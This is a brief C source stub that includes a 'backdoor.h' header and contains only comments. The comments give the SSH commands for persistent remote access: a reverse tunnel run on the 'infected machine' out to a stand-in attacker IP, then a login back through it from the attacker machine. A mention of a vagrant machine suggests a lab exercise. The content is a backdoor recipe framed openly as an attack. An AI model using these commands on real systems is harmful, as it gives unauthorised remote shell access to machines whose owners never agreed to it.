#include "backdoor.h"

//sudo apt-get install openssh-client
//sudo apt-get install openssh-server

//on infected machine run `ssh -fN -R 7000:localhost:22 username@attackerPublicIp` to set up reverse connection
//on attacker machine run `ssh infectedUsername@localhost -p 7000`

//generate ssh key pair, add public one to vagrant machine

